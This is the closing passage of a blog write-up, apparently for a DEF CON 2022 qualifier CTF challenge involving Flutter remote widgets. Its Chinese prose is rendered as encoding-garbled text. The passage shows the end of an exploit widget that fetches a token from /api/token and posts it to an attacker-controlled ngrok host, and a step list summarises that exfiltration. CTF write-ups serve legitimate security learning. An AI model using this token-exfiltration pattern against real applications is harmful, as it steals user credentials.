              <span class="token literal-property property">path</span><span class="token operator">:</span> <span class="token string">"@example.ngrok.io/send"</span><span class="token punctuation">,</span>
              <span class="token literal-property property">body</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>
                <span class="token string-property property">"token"</span><span class="token operator">:</span> data<span class="token punctuation">.</span>new_token
              <span class="token punctuation">&#125;</span>
            <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
          <span class="token punctuation">)</span><span class="token punctuation">,</span>
          <span class="token keyword">switch</span> state<span class="token punctuation">.</span>loaded <span class="token punctuation">&#123;</span>
            <span class="token number">1</span><span class="token operator">:</span> <span class="token function">ApiMapper</span><span class="token punctuation">(</span>
              <span class="token literal-property property">url</span><span class="token operator">:</span> <span class="token string">"/api/token"</span><span class="token punctuation">,</span>
              <span class="token literal-property property">jsonKey</span><span class="token operator">:</span> <span class="token string">"new_token"</span><span class="token punctuation">,</span>
              <span class="token literal-property property">dataKey</span><span class="token operator">:</span> <span class="token string">"new_token"</span><span class="token punctuation">,</span>
              <span class="token literal-property property">onLoaded</span><span class="token operator">:</span> <span class="token keyword">set</span> state<span class="token punctuation">.</span>loaded <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">,</span>
            <span class="token punctuation">)</span><span class="token punctuation">,</span>
            <span class="token keyword">default</span><span class="token operator">:</span> <span class="token function">Text</span><span class="token punctuation">(</span>
              <span class="token literal-property property">text</span><span class="token operator">:</span> <span class="token string">'yo'</span>
            <span class="token punctuation">)</span>
          <span class="token punctuation">&#125;</span>
        <span class="token punctuation">]</span>
      <span class="token punctuation">)</span>
    <span class="token punctuation">]</span>
  <span class="token punctuation">)</span>
<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>é‚£å€‹ switch æ²’åŠŸç”¨ï¼Œæ‹¿æ‰ä¹Ÿæ²’å·®ï¼Œåªæ˜¯å› ç‚ºæ‹¿ä¹‹å‰çš„æ”¹æ‡¶å¾—åˆªè€Œå·²ã€‚</p>
<p>ç¸½ä¹‹æ¦‚å¿µå°±æ˜¯æˆ‘å€‘å¯ä»¥åŒæ™‚ç”¨å…©å€‹ ApiMapperï¼Œç¬¬ä¸€å€‹ç™¼åˆ°æˆ‘å€‘ server çš„è®“å®ƒå…ˆç­‰å€‹ 3 ç§’ï¼Œå¦‚æ­¤ä¸€ä¾†åœ¨ <code>onLoaded</code> è§¸ç™¼æ™‚ï¼Œæ‹¿ token çš„é‚£å€‹ response å·²ç¶“å›ä¾†äº†ï¼Œæ–¼æ˜¯ <code>data.new_token</code> å°±æ˜¯ tokenï¼Œå°±æœƒé€åˆ°æˆ‘å€‘çš„ server ä¾†ã€‚</p>
<p><img src="/img/defcon-2022-qual-writeup/p5.png" alt="token"></p>
<h2><span id="ç¸½çµ">ç¸½çµ</span></h2><p>æœ€å¾Œï¼Œç¸½çµä¸€ä¸‹é€™é¡Œçš„è§£æ³•ï¼š</p>
<ol>
<li>è§€å¯Ÿ Appï¼Œå¾—å‡ºå¯ä»¥è¼‰å…¥è‡ªè¨‚ widget</li>
<li>å­¸ç¿’å¦‚ä½•ç”¢ç”Ÿåˆæ³•çš„ widget</li>
<li>è§€å¯Ÿç¾æœ‰çš„ remote widgetï¼Œå¾—çŸ¥æœ‰ ApiMapper è·Ÿ api_post é€™å…©å€‹æ±è¥¿</li>
<li>è§€å¯Ÿ Appï¼Œç™¼ç¾æœ‰ <code>/api/token</code> å¯ä»¥æ‹¿ token ä¸¦ä¸”æ‹¿åˆ° response</li>
<li>å¯«ä¸€å€‹ widget èƒ½å¤ å…ˆç”¨ ApiMapper æ‹¿ tokenï¼Œå†ç”¨ api_post é€å‡º</li>
</ol>
<p>é€™å°±æ˜¯æˆ‘åœ¨é–‹é ­æ‰€èªªçš„ï¼Œé€™é¡Œé›£åº¦ä¸é«˜ï¼Œè€ƒçš„æ˜¯åŸºæœ¬åŠŸï¼Œè€Œæˆ‘æ‰€è¬‚çš„åŸºæœ¬åŠŸæŒ‡çš„æ˜¯ï¼š</p>
<ol>
<li>è§€å¯ŸåŠ›ï¼šä½ è¦èƒ½è§€å¯Ÿå‡ºé€™é¡Œæœ‰ç”¨ rfwï¼Œä¸¦ä¸”è§€å¯Ÿå‡ºç¾æœ‰æ©Ÿåˆ¶æ˜¯å¦‚ä½•é‹ä½œï¼ŒåŒ…å« <code>/api/token</code>ã€<code>/api/flag</code>ã€å„ç¨®ç¾æˆ widget çš„é‚è¼¯</li>
<li>å­¸ç¿’æ–°æ±è¥¿çš„èƒ½åŠ›ï¼šè¦å¿«é€Ÿå­¸ç¿’ rfw çš„ dart åŸºæœ¬èªæ³•</li>
<li>å¯« code çš„èƒ½åŠ›ï¼šè¦åšå‡ºä¸€å€‹èƒ½å‹•çš„ widgetï¼Œä¸¦ä¸”ä½¿ç”¨ç¾æœ‰æ©Ÿåˆ¶è®“å®ƒå‹•èµ·ä¾†</li>
</ol>
<p>é€™é¡Œçš„æ¦‚å¿µä¸é›£ï¼Œè€ŒèŠ±æ™‚é–“çš„é»åœ¨æ–¼å° flutter&#x2F;dart&#x2F;rfw ä¸ç†Ÿï¼Œæ‰€ä»¥ä¸­é–“æœƒä¸€ç›´å‡ºä¸€äº›èªæ³•éŒ¯èª¤æˆ–æ˜¯ä¸çŸ¥é“ç‚ºä»€éº¼å°±æ˜¯è·‘ä¸èµ·ä¾†çš„ç‹€æ³ã€‚</p>
<p>è€Œè‡ªæˆ‘æª¢è¨çš„è©±ï¼Œå¤§æ¦‚å°±æ˜¯ä¸€é–‹å§‹æ‰¾éŒ¯æ–¹å‘ï¼Œæ‡‰è©²å†è§€å¯Ÿä¸€é™£å­çš„ã€‚ä¾‹å¦‚èªªå¦‚æœåœ¨é–‹é ­å°±æŠŠ poll çš„ widget ä¹Ÿ decode ä¸¦ä¸”ä»”ç´°è§€å¯Ÿï¼Œæä¸å¥½å¯ä»¥çœä¸å°‘æ™‚é–“ã€‚</p>
<p>è©±èªªé€™æ¬¡è·Ÿäº†éšŠä¼æ‰“äº†è³‡æ ¼è³½ä»¥å¾Œï¼Œæœ€å¤§çš„é«”æ‚Ÿå¤§æ¦‚å°±æ˜¯å¦‚æœæƒ³è¦çœŸå¿ƒäº«å— DEF CON CTF çš„è©±ï¼Œé‚„æ˜¯å¿…é ˆè¦æœ‰åŸºæœ¬çš„ binary ç›¸é—œçŸ¥è­˜ã€‚æˆ‘è¦ºå¾—ä¸éœ€è¦åˆ°å¾ˆå¼·ï¼Œä½†è‡³å°‘åŸºæœ¬çš„çŸ¥è­˜è¦æœ‰ï¼ˆä¾‹å¦‚èªªèƒ½è§£å‡ºå…¶ä»– CTF ä¸­å¾ˆç°¡å–®çš„ pwn è·Ÿ reverse é¡Œï¼Ÿï¼‰ï¼Œé€™æ¨£æ‰æ¯”è¼ƒçŸ¥é“éšŠå‹åœ¨å¹¹å˜›ï¼Œæ‰èƒ½æ›´æœ‰åƒèˆ‡æ„Ÿã€‚</p>
<p>åƒæˆ‘é€™æ¨£ä»€éº¼éƒ½ä¸æœƒçš„è©±ï¼Œæˆ‘è‡ªå·±æ˜¯è¦ºå¾—æœ‰é»å¯æƒœã€‚é€™æ„Ÿè¦ºå¤§æ¦‚å°±å¥½åƒæ˜¯ï¼Œä½ è‡³å°‘è¦ç©éä¸€é» LOLï¼Œçœ‹æ¯”è³½æ‰æœƒçŸ¥é“åœ¨å¹¹å˜›ï¼Œæ‰æœƒçŸ¥é“å“ªé‚Šå¥½çœ‹ã€‚å¦‚æœæ²’ç©éçš„è©±ï¼ŒåŸºæœ¬ä¸Šæ˜¯çœ‹ä¸æ‡‚çš„ï¼Œçœ‹åˆ°ç©å®¶é–‹äº†ä¸€å€‹ç¥å¤§çµ•ä¹Ÿæ²’åæ‡‰ã€‚</p>

    
    </div>
    
    <div class="columns is-variable is-1 is-multiline is-mobile">
    
        <span class="column is-narrow"><a class="tag is-light article-tag" href="/tags/Security/">#Security</a></span>
    
    </div>
    
    
    <div class="columns is-mobile is-multiline article-nav">
        <span class="column is-12-mobile is-half-desktop  article-nav-prev">
            
            <a href="/2022/06/14/justctf-2022-writeup/">justCTF 2022 ç­†è¨˜</a>
            
        </span>
        <span class="column is-12-mobile is-half-desktop  article-nav-next">
            
            <a href="/2022/05/23/atomic-css-and-tailwind-css/">æ·ºè«‡ Atomic CSS çš„ç™¼å±•èƒŒæ™¯èˆ‡ Tailwind CSS</a>
            
        </span>
    </div>
    
</article>




<div class="comments">
    <h3 class="title is-4">è©•è«–</h3>
    <script src="https://utteranc.es/client.js"
        repo="aszx87410/huli-blog"
        issue-term="title"
        theme="github-light"
        crossorigin="anonymous"
        async>
</script>
</div>

    </div>
</section>
    <footer class="footer">
    <div class="container">
        <div class="columns content">
            <div class="column is-narrow has-text-centered">
                &copy; 2024 Huli&nbsp;
                Powered by <a href="http://hexo.io/" target="_blank">Hexo</a> & <a
                        target="_blank" rel="noopener" href="http://github.com/ppoffice/hexo-theme-minos">Minos</a>
            </div>
            <div class="column is-hidden-mobile"></div>

            
            <div class="column is-narrow">
                <div class="columns is-mobile is-multiline is-centered">
                
                    
                <a class="column is-narrow" title="GitHub" target="_blank" rel="noopener" href="https://github.com/ppoffice/hexo-theme-minos">
                    
                    GitHub
                    
                </a>
                
                </div>
            </div>
            
            
<div class="column is-narrow has-text-centered">
    <div class="dropdown is-up is-right is-hoverable" style="margin-top: -0.2em;">
        <div class="dropdown-trigger">
            <button class="button is-small" aria-haspopup="true">
                <span class="icon">
                    <i class="fas fa-globe"></i>
                </span>
                <span>ç¹é«”ä¸­æ–‡</span>
                <span class="icon is-small">
            <i class="fas fa-angle-down" aria-hidden="true"></i>
          </span>
            </button>
        </div>
        <div class="dropdown-menu has-text-left" role="menu" style="top:100%">
            <div class="dropdown-content">
            <!-- NOTE: æ°¸é å›åˆ°é¦–é  -->
            
                <a href="/2022/06/03/en/defcon-2022-qual-writeup/" class="dropdown-item">
                    English
                </a>
            
            </div>
        </div>
    </div>
</div>

        </div>
    </div>
</footer>
    <script src="//cdnjs.cloudflare.com/ajax/libs/jquery/3.6.3/jquery.min.js"></script>



    
    
    
    
    
    
<script src="//cdnjs.cloudflare.com/ajax/libs/lightgallery/1.6.8/js/lightgallery-all.min.js"></script>
<script>
    (function ($) {
        $(document).ready(function () {
            if (typeof($.fn.lightGallery) === 'function') {
                $('.article.gallery').lightGallery({ selector: '.gallery-item' });
            }
        });
    })(jQuery);
</script>

    
    
    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.0/clipboard.min.js"></script>
    <style>
        .hljs {
            position: relative;
        }

        .hljs .clipboard-btn {
            float: right;
            color: #9a9a9a;
            background: none;
            border: none;
            cursor: pointer;
        }

        .hljs .clipboard-btn:hover {
          color: #8a8a8a;
        }

        .hljs > .clipboard-btn {
            display: none;
            position: absolute;
            right: 4px;
            top: 4px;
        }

        .hljs:hover > .clipboard-btn {
            display: inline;
        }

        .hljs > figcaption > .clipboard-btn {
            margin-right: 4px;
        }
    </style>
    <script>
      $(document).ready(function () {
        $('figure.hljs').each(function(i, figure) {
          var codeId = 'code-' + i;
          var code = figure.querySelector('.code');
          var copyButton = $('<button>Copy <i class="far fa-clipboard"></i></button>');
          code.id = codeId;
          copyButton.addClass('clipboard-btn');
          copyButton.attr('data-clipboard-target-id', codeId);

          var figcaption = figure.querySelector('figcaption');

          if (figcaption) {
            figcaption.append(copyButton[0]);
          } else {
            figure.prepend(copyButton[0]);
          }
        })

        var clipboard = new ClipboardJS('.clipboard-btn', {
          target: function(trigger) {
            return document.getElementById(trigger.getAttribute('data-clipboard-target-id'));
          }
        });
        clipboard.on('success', function(e) {
          e.clearSelection();
        })
      })
    </script>

    
    

    



<script src="/js/script.js?v=3.js"></script>


    
</body>
</html>